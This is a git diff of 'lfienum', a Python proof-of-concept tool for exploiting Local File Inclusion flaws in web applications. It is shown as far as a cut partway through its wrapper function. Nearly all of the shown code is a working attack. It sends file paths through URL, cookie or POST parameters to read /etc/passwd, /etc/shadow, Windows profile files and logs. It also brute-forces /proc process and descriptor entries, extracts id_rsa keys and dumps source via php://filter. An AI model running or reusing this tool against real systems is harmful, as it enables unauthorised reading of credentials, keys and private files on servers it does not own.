@@ -1,7 +1,5 @@
 #!/usr/bin/python3
-
 # lfienum (PoC) by 0bfxgh0st*
-
 import sys, requests, re, base64
 from bs4 import BeautifulSoup
 
@@ -13,177 +11,177 @@ ColEnd="\033[0m"
 
 def Help():
 
-	print ('Local File Inclusion Enumerator v1.0 by 0bfxgh0st*')
-	print ("Usage python3 lfienum <url> <option>\n")
-	print ("Options:\n")
-	print ("    -X POST/GET                   Request method\n")
-	print ("    --pids <n>                    Bruteforce process id's from 0 to <n> (/proc/<n>/cmdline) [default is set to 999]")
-	print ("    --pid <n>                     Show single process id")
-	print ("    --fd <n>                      Bruteforce file descriptors from 0 to <n> (/proc/self/fd/<n>) [default is set to 30]")
-	print ("    --wrapper <file>              Extract/decode hidden file using a wrapper (php://filter/convert.base64-encode/resource=)")
-	print ("    -w or --wordlist <wordlist>   Use a custom wordlist")
-	print ("    -k or --key                   Extract id_rsa key\n")
-	print ('    -h or --help                  Show help panel')
-	print ('    -ah or --advanced-help        Show advanced help panel\n')
-	print ("    -vvv                          Show package info")
-	print ("    --only-url                    Dump urls only\n")
-	print ("    -x1                           Use XCF_A function print all text between tags (default)")
-	print ("    -x2                           Use XCF_B function print all text that isn't between any tag")
-	print ("    -x3                           Use XCF_C function print content between specific tag")
-	print ("    -x4                           Use XCF_D function delete all content inside <html> and </html> tags\n")
-	print("Enumeration modes:\n")
-	print ("    --data-mode <key name>        Data mode (LFI enumeration via data key)")
-	print ("    --cookie-mode <key name>      Cookie mode (LFI enumeration via cookie key)\n")
-	print ("Examples:\n")
-	print ('    python3 lfienum "http://ghost.server/index.php?page="')
-	print ('    python3 lfienum "http://ghost.server/" --cookie-mode session')
-	print ('    python3 lfienum "http://ghost.server/index.js" --data-mode file')
+  print ('Local File Inclusion Enumerator v1.0 by 0bfxgh0st*')
+  print ("Usage python3 lfienum <url> <option>\n")
+  print ("Options:\n")
+  print ("    -X POST/GET                   Request method\n")
+  print ("    --pids <n>                    Bruteforce process id's from 0 to <n> (/proc/<n>/cmdline) [default is set to 999]")
+  print ("    --pid <n>                     Show single process id")
+  print ("    --fd <n>                      Bruteforce file descriptors from 0 to <n> (/proc/self/fd/<n>) [default is set to 30]")
+  print ("    --wrapper <file>              Extract/decode hidden file using a wrapper (php://filter/convert.base64-encode/resource=)")
+  print ("    -w,  --wordlist <wordlist>    Use a custom wordlist")
+  print ("    -k,  --key                    Extract id_rsa key\n")
+  print ('    -h,  --help                   Show help panel')
+  print ('    -ah, --advanced-help          Show advanced help panel\n')
+  print ("    -v,  -vvv                     Show package info")
+  print ("    -ou, --only-url               Dump urls only\n")
+  print ("    -x1                           Use XCF_A function print all text between tags (default)")
+  print ("    -x2                           Use XCF_B function print all text that isn't between any tag")
+  print ("    -x3                           Use XCF_C function print content between specific tag")
+  print ("    -x4                           Use XCF_D function delete all content inside <html> and </html> tags")
+  print ("    --exclude <string>            Exclude responses that contains given string\n")
+  print ("Enumeration modes:\n")
+  print ("    --data-mode <key name>        Data mode (LFI enumeration via data key)")
+  print ("    --cookie-mode <key name>      Cookie mode (LFI enumeration via cookie key)\n")
+  print ("Examples:\n")
+  print ('    python3 lfienum "http://ghost.server/index.php?page="')
+  print ('    python3 lfienum "http://ghost.server/" --cookie-mode session')
+  print ('    python3 lfienum "http://ghost.server/index.js" --data-mode file')
 
 def AdHelp():
 
-	print ('\n[Default scan]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page="')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" -x2')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --only-url -x3')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --only-url -vvv\n')
-	print ('[Bruteforece process id]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 857')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 259 -x4')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 325 --only-url')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 8492 --only-url -vvv\n')	
-	print ('[Single process id]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 1')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 487 -vvv')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 371 --only-url')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 6234 --only-url -vvv\n')
-	print ('[Bruteforce File Descriptors]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 56 -x2')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 622 -vvv')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 842 --only-url')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 5654 --only-url -vvv\n')
-	print ('[Wrapper]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper index.php -x3')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper /etc/passwd -vvv')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper db.php --only-url')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper login.php --only-url -vvv\n')
-	print ('[Wordlist]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" -w wordlist.txt')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt -vvv -x2')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt --only-url -x3')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt --only-url -vvv\n')
-	print ('[ID RSA]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" -k')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" -k -x2')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url')
-	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url -vvv\n')
-	print ('[COOKIE MODE]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php" --cookie-mode session')
-	print ('    python3 lfienum "http://ghost.server/index.php" --cookie-mode PHPSESSID -k -x4')
-	print ('    python3 lfienum "http://ghost.server/index.php" --cookie-mode session --pids 847 --only-url')
-	print ('    python3 lfienum "http://ghost.server/index.php" --cookie-mode session --wrapper index.php --only-url -vvv\n')
-	print ('[DATA MODE]\n')
-	print ('    python3 lfienum "http://ghost.server/index.php" --data-mode file')
-	print ('    python3 lfienum "http://ghost.server/index.php" --data-mode img -k -x3')
-	print ('    python3 lfienum "http://ghost.server/index.php" --data-mode file --pids 137 --only-url')
-	print ('    python3 lfienum "http://ghost.server/index.php" --data-mode file --wrapper index.php --only-url -vvv\n')
+  print ('\n[Default scan]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php?page="')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" -x2')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --only-url -x3')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --only-url -vvv\n')
+  print ('[Bruteforece process id]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 857')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 259 -x4')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 325 --only-url')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pids 8492 --only-url -vvv\n')	
+  print ('[Single process id]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 1')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 487 -vvv')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 371 --only-url')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --pid 6234 --only-url -vvv\n')
+  print ('[Bruteforce File Descriptors]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 56 -x2')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 622 -vvv')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 842 --only-url')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --fd 5654 --only-url -vvv\n')
+  print ('[Wrapper]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper index.php -x3')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper /etc/passwd -vvv')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper db.php --only-url')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --wrapper login.php --only-url -vvv\n')
+  print ('[Wordlist]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" -w wordlist.txt')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt -vvv -x2')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt --only-url -x3')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt --only-url -vvv\n')
+  print ('[ID RSA]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" -k')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" -k -x2')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url')
+  print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url -vvv\n')
+  print ('[COOKIE MODE]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php" --cookie-mode session')
+  print ('    python3 lfienum "http://ghost.server/index.php" --cookie-mode PHPSESSID -k -x4')
+  print ('    python3 lfienum "http://ghost.server/index.php" --cookie-mode session --pids 847 --only-url')
+  print ('    python3 lfienum "http://ghost.server/index.php" --cookie-mode session --wrapper index.php --only-url -vvv\n')
+  print ('[DATA MODE]\n')
+  print ('    python3 lfienum "http://ghost.server/index.php" --data-mode file')
+  print ('    python3 lfienum "http://ghost.server/index.php" --data-mode img -k -x3')
+  print ('    python3 lfienum "http://ghost.server/index.php" --data-mode file --pids 137 --only-url')
+  print ('    python3 lfienum "http://ghost.server/index.php" --data-mode file --wrapper index.php --only-url -vvv\n')
 
 if '-h' in sys.argv or '--help' in sys.argv:
-
-	Help()
-	sys.exit(1)
-		
-if '-ah' in sys.argv or '--advanced-help' in sys.argv:
-	
-	Help()
-	AdHelp()
-	sys.exit(1)
-
+  Help()
+  exit(1)
+if '-ah' in sys.argv or '--advanced-help' in sys.argv:	
+  Help()
+  AdHelp()
+  exit(1)
 try:
-
-	url = sys.argv[1]
-
+  url = sys.argv[1]
 except IndexError:
-
-	Help()
-	sys.exit(1)
+  Help()
+  exit(1)
 
 headers = {
-
-    'User-Agent': '--'
+  'User-Agent': '--'
 }
 
 def CheckCon():
 
-	try:
+  try:		
+    r = request(url, headers=headers, timeout=10)
+    try:
+      selection_wordlist = [linux_wordlist,windows_wordlist]
+      if 'microsoft'.casefold() in r.headers['Server'].casefold() or 'asp.net'.casefold() in r.headers['X-Powered-By'].casefold():
+        prior_wordlist = selection_wordlist[1]
+        later_wordlist = selection_wordlist[0]
+      else:
+        prior_wordlist = selection_wordlist[0]
+        later_wordlist = selection_wordlist[1]	
+    except KeyError:
+      prior_wordlist = selection_wordlist[0]
+      later_wordlist = selection_wordlist[1]
+      pass		
+  except requests.exceptions.ConnectTimeout:
+    print ('Connection timed out.')
+    exit(1)	
+  except requests.exceptions.ConnectionError:	
+    print ('Failed to establish a new connection: [Errno -2] Name or service not known')
+    exit(1)
+  except requests.exceptions.MissingSchema:
+    print ("Invalid URL '" + url + "': No scheme supplied.")
+    exit(1)
 
-		check_con = requests.get(url, headers=headers, timeout=10)
+  return prior_wordlist,later_wordlist
 
-	except requests.exceptions.ConnectTimeout:
+def XCF_A(response):                  # this function aims to print all text between tags (default)
 
-		print ('Connection timed out.')
-		sys.exit(1)
-	
-	except requests.exceptions.ConnectionError:	
+  proc_out = re.sub('<[^<]+?>', '', response.text)			
+  content = proc_out.strip()
+  return content
 
-		print ('Failed to establish a new connection: [Errno -2] Name or service not known')
-		sys.exit(1)
+def XCF_B(response):                  # this function aims to print all text that isn't between any tag
 
-	except requests.exceptions.MissingSchema:
+  proc_out = re.sub('<[^<].*>', '', response.text)
+  content = proc_out.strip()
+  return content
 
-		print ("Invalid URL '" + url + "': No scheme supplied.")
-		sys.exit(1)
+def XCF_C(response):                  # this function aims to print content between specific tags
 
-def XCF_A():                  # this function aims to print all text between tags (default)
+  soup = BeautifulSoup(response.content, 'html.parser')
+  try:
+    content = soup.find_all('p')[0].text.strip()
+  except IndexError:
+    Help()
+    print("\n\nWARNING: Could not find correct tag, consider use of other -x flag")
+    exit(1)
+  #for i in soup.find_all(["p"]):
+    #content = i.text
+  return content
+  
+def XCF_D(response):                  # this function aims to delete all content inside <html> & </html> tags 
 
-	global clean_content
-	content = resp.text
-	out = re.sub('<[^<]+?>', '', content)			
-	clean_content = out.strip()
+  soup = BeautifulSoup(response.content, 'html.parser')
+  for i in soup.find_all('html'):
+    i.decompose()   # same as i.replaceWith('')
+  content = soup.get_text().strip()
+  return content
 
-def XCF_B():                  # this function aims to print all text that isn't between any tag
+def PackageStatus(response,content):
 
-	global clean_content
-	content = resp.text
-	out = re.sub('<[^<].*>', '', content)
-	clean_content = out.strip()
-
-def XCF_C():                  # this function aims to print content between specific tags
-
-	global clean_content
-	soup = BeautifulSoup(resp.content, 'html.parser')
-	clean_content = soup.find_all('p')[0].text.strip()
-	#for i in soup.find_all(["p"]):
-		#clean_content = i.text
-
-def XCF_D():                  # this function aims to delete all content inside <html> & </html> tags 
-	
-	global clean_content
-	soup = BeautifulSoup(resp.content, 'html.parser')
-	for i in soup.find_all('html'):
-		i.decompose()   # same as i.replaceWith('')
-	clean_content = soup.get_text().strip()
-
-def PackageStatus():
-
-	print ('[Response Code]:', resp.status_code)
-	print ('[Content Lenght]:', len(clean_content))
-	lines = 0
-	for i in clean_content:
-		if i == '\n':
-			lines += 1
-	print ('[Content Lines]:', lines+1, '\n')
+  print ('[Response Code]:', response.status_code)
+  print ('[Content Lenght]:', len(content))
+  lines = 0
+  for nl in content:
+    if nl == '\n':
+      lines += 1
+  print ('[Content Lines]:', lines+1, '\n')
 	
 only_url=False
 package_status=False
-if '-vvv' in sys.argv:
-
-	package_status=True
-	
-if '--only-url' in sys.argv:
-
-	only_url=True
+if '-v' in sys.argv or '-vvv' in sys.argv:
+  package_status=True	
+if '--only-url' in sys.argv or '-ou' in sys.argv:
+  only_url=True
 
 XCF = XCF_A
 if '-x1' in sys.argv:
@@ -195,7 +193,7 @@ if '-x3' in sys.argv:
 if '-x4' in sys.argv:
 	XCF = XCF_D
 
-linux_lfi_wordlist=['/etc/passwd',
+linux_wordlist=['/etc/passwd',
 '/etc/shadow',
 '/etc/aliases',
 '/etc/anacrontab',
@@ -1058,7 +1056,7 @@ linux_lfi_wordlist=['/etc/passwd',
 '/www/logs/freebsddiary-error.log',
 '/www/logs/proftpd.system.log']
 
-windows_lfi_wordlist=['C:/Users/Administrator/NTUser.dat',
+windows_wordlist=['C:/Users/Administrator/NTUser.dat',
 'C:/Documents and Settings/Administrator/NTUser.dat',
 'C:/apache/logs/access.log',
 'C:/apache/logs/error.log',
@@ -1294,622 +1292,332 @@ windows_lfi_wordlist=['C:/Users/Administrator/NTUser.dat',
 'c:/WINDOWS/system32/Macromed/Flash/FlashInstall.log',
 'c:/WINDOWS/system32/Macromed/Flash/install.log']
 
-def LinEnum():
 
-	for possible_lfi_file in linux_lfi_wordlist:
+def Enum(prior_wordlist, later_wordlist):
 
-		global resp
+  for wordlist in prior_wordlist,later_wordlist:
+    for possible_lfi_file in wordlist:
+      if cookie_mode == True:
+        response = request(url, cookies={cookie:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)
+      if data_mode == True:
+        response = request(url, data={data:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)		
+      if cookie_mode is None and data_mode is None:		
+        response = request(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
+      if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+        content = XCF(response)       			        
+        if len(content) > 0 and content != blacklist:
+          if cookie_mode == True:
+            print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file + ColEnd)
+          if data_mode == True:
+            print (ColGreenMark + "> " + url + ' ' + data + '=' + possible_lfi_file + ColEnd)			
+          if cookie_mode is None and data_mode is None:				
+            print (ColGreenMark + "> " + url + possible_lfi_file + ColEnd)
+          if package_status == True:	
+            PackageStatus(response, content)	
+          if only_url == False:		
+            print (content)
 
-		if cookie_mode == True:
+  return response
 
-			resp = request(url, cookies={cookie:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)
-		
-		if data_mode == True:
-
-			resp = request(url, data={data:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)
-		
-		else:
-		
-			resp = request(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
-
-		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
-
-			XCF()
-			
-			if len(clean_content) > 0:
-			
-				if cookie_mode == True:
-				
-					print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file + ColEnd)
-					
-				if data_mode == True:
-
-					print (ColGreenMark + "> " + url + ' ' + data + '=' + possible_lfi_file + ColEnd)
-			
-				else:
-				
-					print (ColGreenMark + "> " + url + possible_lfi_file + ColEnd)
-
-				if package_status == True:
-	
-					PackageStatus()
-	
-				if only_url == False:	
-	
-					print (clean_content)
-
-def WinEnum():
-
-	for possible_lfi_file in windows_lfi_wordlist:
-
-		global resp
-		if cookie_mode == True:
-
-			resp = request(url, cookies={cookie:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)
-		
-		if data_mode == True:
-
-			resp = request(url, data={data:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)
-		
-		else:
-		
-			resp = request(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
-
-		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
-
-			XCF()
-
-			if len(clean_content) > 0:
-			
-				if cookie_mode == True:
-				
-					print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file + ColEnd)
-					
-				if data_mode == True:
-
-					print (ColGreenMark + "> " + url + ' ' + data + '=' + possible_lfi_file + ColEnd)
-			
-				else:
-				
-					print (ColGreenMark + "> " + url + possible_lfi_file + ColEnd)
-				
-				if package_status == True:
-	
-					PackageStatus()
-					
-				if only_url == False:		
-				
-					print(clean_content)
 	
 def Wordlist():
 
-	with open(wordlist, 'r') as custom_wordlist:
+  with open(wordlist, 'r') as custom_wordlist:
+    for possible_lfi_file in custom_wordlist:    
+      if cookie_mode == True:
+        response = request(url, cookies={cookie:possible_lfi_file.strip()}, verify=True, headers=headers, allow_redirects=False)			
+      if data_mode == True:
+        response = request(url, data={data:possible_lfi_file.strip()}, verify=True, headers=headers, allow_redirects=False)			
+      if cookie_mode is None and data_mode is None:
+        response = request(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)
+      if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+        content = XCF(response)
+        if len(content) > 0 and content != blacklist:				
+          if cookie_mode == True:					
+            print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file.strip() + ColEnd)						
+          if data_mode == True:
+            print (ColGreenMark + "> " + url + ' ' + data + '=' + possible_lfi_file + ColEnd)				
+          if cookie_mode is None and data_mode is None:					
+            print (ColGreenMark + "> " + url + possible_lfi_file.strip() + ColEnd)					
+          if package_status == True:	
+            PackageStatus(response,content)						
+          if only_url == False:					
+            print (content)
 
-		for possible_lfi_file in custom_wordlist:
-
-			global resp
-
-			if cookie_mode == True:
-
-				resp = request(url, cookies={cookie:possible_lfi_file.strip()}, verify=True, headers=headers, allow_redirects=False)
-			
-			if data_mode == True:
-
-				resp = request(url, data={data:possible_lfi_file.strip()}, verify=True, headers=headers, allow_redirects=False)
-			
-			else:
-
-				resp = request(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)
-
-			if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
-
-				XCF()
-
-				if len(clean_content) > 0:
-				
-					if cookie_mode == True:
-					
-						print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file.strip() + ColEnd)
-						
-					if data_mode == True:
-
-						print (ColGreenMark + "> " + url + ' ' + data + '=' + possible_lfi_file + ColEnd)
-				
-					else:
-					
-						print (ColGreenMark + "> " + url + possible_lfi_file.strip() + ColEnd)
-					
-					if package_status == True:
-	
-						PackageStatus()
-						
-					if only_url == False:
-					
-						print (clean_content)
+  return response
 
 def PIDS():
+  	
+  print ("Bruteforcing 0-" + str(pids) + " PIDS\n")
+  for pid in range(pids+1):
+    if cookie_mode == True:		
+      response = request(url, cookies={cookie:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)		
+    if data_mode == True:
+      response = request(url, data={data:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)		
+    if cookie_mode is None and data_mode is None:		
+      response = request(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
+    if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+      content = XCF(response)
+      if len(content) > 0 and content != blacklist:
+        if only_url == False:
+          print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + content.strip())
+        if only_url == True:				
+          if cookie_mode == True:					
+            print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/' + str(pid) + '/cmdline' + ColEnd)						
+          if data_mode == True:					
+            print (ColGreenMark + "> " + url + ' ' + data + '=/proc/' + str(pid) + '/cmdline' + ColEnd)					
+          if cookie_mode is None and data_mode is None:					
+            print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
+        if package_status == True:	
+          PackageStatus(response, content)
 
-	try:
-	
-		pid_count=int(pids_x)
-		
-	except ValueError:
-	
-		pid_count=999
-	
-	print ("Bruteforcing 0-" + str(pid_count) + " PIDS\n")
-	for pid in range(pid_count+1):
-
-		global resp
-	
-		if cookie_mode == True:
-		
-			resp = request(url, cookies={cookie:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)
-		
-		if data_mode == True:
-
-			resp = request(url, data={data:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)
-		
-		else:
-		
-			resp = request(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
-
-		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
-
-			XCF()
-
-			if len(clean_content) > 0:
-
-				if only_url == False:
-
-					print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + clean_content.strip())
-
-				if only_url == True:
-				
-					if cookie_mode == True:
-					
-						print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/' + str(pid) + '/cmdline' + ColEnd)
-						
-					if data_mode == True:
-					
-						print (ColGreenMark + "> " + url + ' ' + data + '=/proc/' + str(pid) + '/cmdline' + ColEnd)
-					
-					else:
-					
-						print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
-
-				if package_status == True:
-	
-					PackageStatus()
+  return response
 
 def PID():
 
-	pid = int(pid_x)
-	global resp
-	
-	if cookie_mode == True:
-		
-		resp = request(url, cookies={cookie:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)	
-	
-	if data_mode == True:
+  if cookie_mode == True:		
+    response = request(url, cookies={cookie:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)		
+  if data_mode == True:
+    response = request(url, data={data:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)	
+  if cookie_mode is None and data_mode is None:		
+    response = request(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
+  if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+    content = XCF(response)
+    if len(content) > 0 and content != blacklist:
+      if only_url == False:
+        print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + content.strip())
+      if only_url == True:			
+        if cookie_mode == True:				
+          print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/' + str(pid) + '/cmdline' + ColEnd)					
+        if data_mode == True:				
+          print (ColGreenMark + "> " + url + ' ' + data + '=/proc/' + str(pid) + '/cmdline' + ColEnd)									
+        if cookie_mode is None and data_mode is None:
+          print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
+      if package_status == True:	
+        PackageStatus(response, content)
+        
+  return response
 
-		resp = request(url, data={data:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)
-	
-	else:
-		
-		resp = request(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
+def FD(fd):
 
-	if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
-
-		XCF()
-
-		if len(clean_content) > 0:
-
-			if only_url == False:
-
-				print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + clean_content.strip())
-
-			if only_url == True:
-			
-				if cookie_mode == True:
-				
-					print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/' + str(pid) + '/cmdline' + ColEnd)
-					
-				if data_mode == True:
-				
-					print (ColGreenMark + "> " + url + ' ' + data + '=/proc/' + str(pid) + '/cmdline' + ColEnd)
-					
-				
-				else:
-					print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
-
-			if package_status == True:
-	
-				PackageStatus()
-
-def FD():
-
-	try:
-
-		fd_count=int(fd_x)
-		
-	except ValueError:
-
-		fd_count=30
-
-	print ("Bruteforcing 0-" + str(fd_count) + " /proc/self/fd/X\n")
-	for fd in range(fd_count+1):
-
-		global resp
-		
-		if cookie_mode == True:
-		
-			resp = request(url, cookies={cookie:'/proc/self/fd/' + str(fd)}, verify=True, headers=headers, allow_redirects=False)
-		
-		if data_mode == True:
-
-			resp = request(url, data={data:'/proc/self/fd/' + str(fd)}, verify=True, headers=headers, allow_redirects=False)
-		
-		else:
-			resp = request(url + '/proc/self/fd/' + str(fd), verify=True, headers=headers, allow_redirects=False)
-
-		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
-
-			XCF()
-
-			if len(clean_content) > 0:
-			
-				if cookie_mode == True:
-				
-					print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/self/fd/' + str(fd) + ColEnd)
-					
-				if data_mode == True:
-				
-					print (ColGreenMark + "> " + url + ' ' + data + '=/proc/self/fd/' + str(fd) + ColEnd)
-						
-				else:
-				
-					print (ColGreenMark + "> " + url + '/proc/self/fd/' + str(fd) + ColEnd)
-				
-				if package_status == True:
-	
-					PackageStatus()
-				
-				if only_url == False:
-				
-					print(clean_content)
+  print ("Bruteforcing 0-" + str(fd) + " /proc/self/fd/X\n")
+  for fd in range(fd+1):
+    if cookie_mode == True:		
+      response = request(url, cookies={cookie:'/proc/self/fd/' + str(fd)}, verify=True, headers=headers, allow_redirects=False)		
+    if data_mode == True:
+      response = request(url, data={data:'/proc/self/fd/' + str(fd)}, verify=True, headers=headers, allow_redirects=False)		
+    if cookie_mode is None and data_mode is None:
+      response = request(url + '/proc/self/fd/' + str(fd), verify=True, headers=headers, allow_redirects=False)
+    if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+      content = XCF(response)
+      if len(content) > 0 and content != blacklist:		
+        if cookie_mode == True:				
+          print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/self/fd/' + str(fd) + ColEnd)					
+        if data_mode == True:				
+          print (ColGreenMark + "> " + url + ' ' + data + '=/proc/self/fd/' + str(fd) + ColEnd)						
+        if cookie_mode is None and data_mode is None:				
+          print (ColGreenMark + "> " + url + '/proc/self/fd/' + str(fd) + ColEnd)				
+        if package_status == True:	
+          PackageStatus(response, content)				
+        if only_url == False:				
+          print(content)
+          
+  return response
 
 def Wrapper():
 
-	global resp
-	
-	if cookie_mode == True:
-	
-		resp = request(url, cookies={cookie:'php://filter/convert.base64-encode/resource=' + wrap_x}, verify=True, headers=headers, allow_redirects=False)	
-	
-	if data_mode == True:
-
-		resp = request(url, data={data:'php://filter/convert.base64-encode/resource=' + wrap_x}, verify=True, headers=headers, allow_redirects=False)
-	
-	else:
-		resp = request(url + 'php://filter/convert.base64-encode/resource=' + wrap_x, verify=True, headers=headers, allow_redirects=False)
-	
-	XCF()
-	
-	if len(clean_content) > 0:
-	
-	
-		if cookie_mode == True:
-		
-			print(ColGreenMark + "> " + url + ' ' + cookie + '=php://filter/convert.base64-encode/resource=' + wrap_x + ColEnd)
-			
-		if data_mode == True:
-		
-			print(ColGreenMark + "> " + url + ' ' + data + '=php://filter/convert.base64-encode/resource=' + wrap_x + ColEnd)
-	
-		else:
-		
-			print(ColGreenMark + "> " + url + 'php://filter/convert.base64-encode/resource=' + wrap_x + ColEnd)
-		
-		if package_status == True:
-		
-			print ('[Response Code]:', resp.status_code)
-			print ('[Encoded Content Lenght]:', len(clean_content), '\n')
-
-		if only_url == False:
-
-			print (clean_content.strip("\n"))
-			
-			try:
-				print("\n" + base64.b64decode(clean_content).decode('utf-8'))
-	
-			except UnicodeDecodeError:
-	
-				print ('\n\n' + ColRedMark + 'Something went wrong while decoding base64. Junk data? Try decoding manually or use other XCF function' + ColEnd + '\n')
-				sys.exit(1)
+  if cookie_mode == True:	
+    response = request(url, cookies={cookie:'php://filter/convert.base64-encode/resource=' + wrapper}, verify=True, headers=headers, allow_redirects=False)		
